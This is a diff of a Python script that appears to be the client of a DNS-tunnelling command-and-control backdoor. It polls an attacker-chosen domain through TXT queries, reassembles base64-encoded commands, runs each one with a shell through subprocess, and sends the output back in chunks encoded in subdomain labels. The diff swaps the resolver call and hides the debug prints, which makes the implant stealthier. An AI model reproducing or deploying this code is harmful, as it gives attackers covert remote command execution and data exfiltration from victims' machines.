@@ -69,10 +69,11 @@ def main():
             sleep(args.timeout)
             subd = b"CHK" + encode32(str(datetime.datetime.now())) # check in for commands
             if subd.endswith(b"-"): subd += b"0" # can't end a subdomain with "-"
-            answer = res.query(subd.decode('utf-8') + args.domain, "TXT")
+            # answer = res.query(subd.decode('utf-8') + args.domain, "TXT")
+            answer = res.resolve(subd.decode('utf-8') + args.domain, "TXT")
             answer = answer[0].to_text().replace('"','') # avoid quotes in answer
             msgType = answer[:3]
-            print(f"{OR}answer is {OV}{answer}{OR}, and it's {OV}{len(answer)}{OR} bytes long{OM}")
+            if debuggin: print(f"{OV}answer is {OR}{answer}{OV}, and it's {OR}{len(answer)}{OV} bytes long{OM}")
             if len(answer) > 3: answer = decode64(answer[3:]).decode('utf-8')
             if debuggin: print(f"{OV}Received answer {OR}{answer}{OV} of type {OR}{msgType}{OM}")
             if msgType == "NUL": # nop if nothing from server
@@ -83,25 +84,25 @@ def main():
             elif msgType == "HDR": # command header; process
                 if debuggin: print(f"{OV}HDR from server, answer is {OR}{answer}{OM}")
                 cmdPktCt = int(answer) # how many lines long is the command?
-                print(f"{OR}Command is {OV}{cmdPktCt}{OR} chunks long{OR}")
+                if debuggin: print(f"{OV}Command is {OR}{cmdPktCt}{OR} chunks long{OR}")
                 command64 = ""
                 for i in range(cmdPktCt): # get all lines
                     subd = b"CON" + encode32(str(datetime.datetime.now()))
-                    answer = res.query(subd.decode('utf-8') + args.domain, "TXT")
+                    answer = res.resolve(subd.decode('utf-8') + args.domain, "TXT")
                     answer = answer[0].to_text().replace('"','') # avoid quotes in answer
                     msgType = answer[:3]
                     command64 += answer[3:]
-                    print(f"{OR}msgType is {OV}{msgType}{OR} and command64 so far is {OR}{command64}{OM}")
+                    if debuggin: print(f"{OV}msgType is {OR}{msgType}{OV} and command64 so far is {OR}{command64}{OM}")
                 # output = subprocess.check_output("cat /etc/services", shell=True)
-                print(f"{OR}Executing command64 {OV}{command64}{OR}", end="")
+                if debuggin: print(f"{OV}Executing command64 {OR}{command64}{OV}", end="")
                 command = decode64(command64).decode('utf-8')
-                print(f"{OR} a.k.a. {OV}{command}{OM}")
+                if debuggin: print(f"{OV} a.k.a. {OR}{command}{OM}")
                 output = subprocess.check_output(command, shell=True)
-                print(f"{OR}Command output: {OV}{output}{OM}")
+                if debuggin: print(f"{OV}Command output: {OR}{output}{OM}")
                 codedOutput = encode32(output)
                 respPktCt = int(len(codedOutput) / 55) + 1 # number of packets to send response
                 subd = b"HDR" + encode32(str(respPktCt) + " " + str(datetime.datetime.now())) # tell how many packets of response are coming
-                answer = res.query(subd.decode('utf-8') + args.domain, "TXT")
+                answer = res.resolve(subd.decode('utf-8') + args.domain, "TXT")
                 answer = answer[0].to_text().replace('"','') # avoid quotes in answer
                 msgType = answer[:3]
                 chunks = wrap(codedOutput.decode('utf-8'),55)
@@ -114,9 +115,9 @@ def main():
                     subd = b"RES" + chunk.encode('utf-8')
                     if subd.endswith(b"-"): subd += b"0" # can't start/end subdomain with "-"
                     # if subd.startswith(b"-"): subd = b"0" + subd
-                    print(f"{OR}Chunk looks like {OV}{chunk}{OR}; there are {OV}{len(chunks)}{OR} chunks.{OM}")
-                    print(f"{OR}subd looks like {OV}{subd}{OM}")
-                    answer = res.query(subd.decode('utf-8') + args.domain, "TXT")
+                    if debuggin: print(f"{OV}Chunk looks like {OR}{chunk}{OV}; there are {OR}{len(chunks)}{OV} chunks.{OM}")
+                    if debuggin: print(f"{OV}subd looks like {OR}{subd}{OM}")
+                    answer = res.resolve(subd.decode('utf-8') + args.domain, "TXT")
                     answer = answer[0].to_text().replace('"','') # avoid quotes in answer
                     msgType = answer[:3]
                     # if decode64(answer[0].to_text())[:5] != "ACK" + hex(i)[-2:]:
